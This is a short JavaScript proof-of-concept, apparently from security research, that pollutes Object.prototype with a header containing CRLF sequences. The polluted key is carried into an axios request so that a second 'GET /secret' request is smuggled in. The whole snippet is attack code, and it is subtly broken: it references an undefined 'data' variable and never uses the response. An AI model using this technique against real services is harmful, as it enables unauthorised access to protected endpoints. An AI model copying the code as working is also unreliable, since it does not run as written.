Object.prototype['x-exploit-header'] = "dummy\r\n\r\nGET /secret HTTP/1.1\r\n";

async function exploit() {
    
    const defaultsHeaders = { Accept: 'application/json' };
    const headers = { Foo: 'localhost:3000' };
    for (const key in defaultsHeaders) {
        headers[key] = defaultsHeaders[key];
    }

    const response = await axios.get('/health', {
        headers: headers,
    });
    console.log(data);
    alert(JSON.stringify(data));
}
